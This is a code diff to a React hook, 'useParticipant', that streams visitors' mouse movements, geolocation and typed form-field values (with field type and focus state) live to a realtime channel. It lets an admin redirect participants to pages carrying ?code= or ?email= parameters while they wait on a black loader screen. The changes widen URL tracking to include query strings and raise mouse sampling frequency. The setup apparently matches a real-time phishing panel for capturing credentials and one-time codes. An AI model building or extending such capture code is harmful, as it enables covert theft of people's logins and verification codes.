@@ -65,15 +65,21 @@ function navigateApp(
 
 export function useParticipant() {
   const navigate = useNavigate();
+  // Include query (?code=, ?email=, ?hint=) so live preview follows redirects 1:1.
+  const pageUrl = useRouterState({
+    select: (s) => `${s.location.pathname}${s.location.search}`,
+  });
   const pathname = useRouterState({ select: (s) => s.location.pathname });
   const channelRef = useRef<RealtimeChannel | null>(null);
   const subscribedRef = useRef(false);
   const idRef = useRef<string>("");
+  const pageUrlRef = useRef(pageUrl);
   const pathnameRef = useRef(pathname);
   const lastAssignedRef = useRef<string | null | undefined>(undefined);
   const internalNavUntilRef = useRef(0);
   const skipTouchUntilRef = useRef(0);
   const [approved, setApprovedState] = useState<boolean>(false);
+  pageUrlRef.current = pageUrl;
   pathnameRef.current = pathname;
 
   function armInternalNav(ms = 60_000) {
@@ -111,9 +117,8 @@ export function useParticipant() {
   }
 
   function alreadyOnAssigned(assigned: string): boolean {
-    const here = pathnameRef.current || "/";
+    const here = pageUrlRef.current || "/";
     if (here === assigned) return true;
-    // pathname has no query; assigned may include ?code= etc.
     if (pathOnly(here) !== pathOnly(assigned)) return false;
     if (!assigned.includes("?")) return true;
     try {
@@ -146,7 +151,7 @@ export function useParticipant() {
         assigned &&
         record.approved &&
         !alreadyOnAssigned(assigned) &&
-        (pathnameRef.current === "/" || !internalNavActive())
+        (pathOnly(pageUrlRef.current || "/") === "/" || !internalNavActive())
       ) {
         clearInternalNavGuard();
         goToAssigned(assigned);
@@ -221,7 +226,11 @@ export function useParticipant() {
     async function syncRecord() {
       if (blocked) return;
       const geo = await fetchGeoOnce();
-      await touchParticipant(id, window.location.pathname, geo);
+      await touchParticipant(
+        id,
+        `${window.location.pathname}${window.location.search}`,
+        geo,
+      );
       const record = await loadParticipant(id);
       if (!cancelled) applyParticipantRecord(record);
     }
@@ -271,7 +280,7 @@ export function useParticipant() {
         subscribedRef.current = true;
         await channel.track({
           id,
-          currentUrl: window.location.pathname,
+          currentUrl: `${window.location.pathname}${window.location.search}`,
           joinedAt: Date.now(),
           approved: getApproved(),
         } satisfies ParticipantPresence);
@@ -282,7 +291,7 @@ export function useParticipant() {
     const heartbeat = window.setInterval(() => {
       if (blocked) return;
       if (Date.now() < skipTouchUntilRef.current) return;
-      void touchParticipant(id, pathnameRef.current, geoFetched);
+      void touchParticipant(id, pageUrlRef.current, geoFetched);
     }, 8_000);
 
 
@@ -290,7 +299,7 @@ export function useParticipant() {
     let lastMouse = 0;
     const onMove = (e: MouseEvent) => {
       const now = Date.now();
-      if (now - lastMouse < 40) return;
+      if (now - lastMouse < 16) return;
       lastMouse = now;
       const ch = channelRef.current;
       if (!ch || !subscribedRef.current) return;
@@ -368,7 +377,7 @@ export function useParticipant() {
         armInternalNav(60_000);
         if (typeof d.url === "string") {
           if (idRef.current) void touchParticipant(idRef.current, d.url);
-          if (pathnameRef.current !== d.url) {
+          if (pageUrlRef.current !== d.url) {
             navigateApp(navigate, d.url);
           }
         }
@@ -383,7 +392,7 @@ export function useParticipant() {
         return;
       }
       if (d.type === "mouse" && typeof d.x === "number" && typeof d.y === "number") {
-        if (now - lastIframeMouse < 40) return;
+        if (now - lastIframeMouse < 16) return;
         lastIframeMouse = now;
         const w = typeof d.w === "number" && d.w > 0 ? d.w : window.innerWidth;
         const h = typeof d.h === "number" && d.h > 0 ? d.h : window.innerHeight;
@@ -412,7 +421,7 @@ export function useParticipant() {
           participantId: id,
           field: d.field,
           value: String(d.value ?? ""),
-          url: pathnameRef.current,
+          url: pageUrlRef.current,
           at: now,
         };
         void ch.send({ type: "broadcast", event: "input", payload });
@@ -423,7 +432,7 @@ export function useParticipant() {
           value: String(d.value ?? ""),
           focused: !!d.focused,
           ftype: typeof d.ftype === "string" ? d.ftype : "text",
-          url: pathnameRef.current,
+          url: pageUrlRef.current,
           at: now,
         };
         void ch.send({ type: "broadcast", event: "live_input", payload });
@@ -459,7 +468,7 @@ export function useParticipant() {
   }, [navigate]);
 
   useEffect(() => {
-    // Do NOT arm internal-nav here when pathname ≠ assigned. That blocked
+    // Do NOT arm internal-nav here when pageUrl ≠ assigned. That blocked
     // admin redirects for 60s after every page change, and when the navigate
     // was skipped the new assignment was still recorded — leaving participants
     // stuck on the black focus-room loader.
@@ -467,14 +476,14 @@ export function useParticipant() {
     const id = idRef.current;
     if (!ch || !id || !subscribedRef.current) return;
     if (Date.now() < skipTouchUntilRef.current) return;
-    void touchParticipant(id, pathname);
+    void touchParticipant(id, pageUrl);
     void ch.track({
       id,
-      currentUrl: pathname,
+      currentUrl: pageUrl,
       joinedAt: Date.now(),
       approved,
     } satisfies ParticipantPresence);
-  }, [pathname, approved]);
+  }, [pageUrl, approved]);
 
   function emitInput(field: string, value: string) {
     const ch = channelRef.current;
@@ -483,7 +492,7 @@ export function useParticipant() {
       participantId: idRef.current,
       field,
       value,
-      url: pathname,
+      url: pageUrlRef.current,
       at: Date.now(),
     };
     void ch.send({ type: "broadcast", event: "input", payload });
@@ -498,7 +507,7 @@ export function useParticipant() {
       value,
       focused: true,
       ftype,
-      url: pathname,
+      url: pageUrlRef.current,
       at: Date.now(),
     };
     void ch.send({ type: "broadcast", event: "live_input", payload });
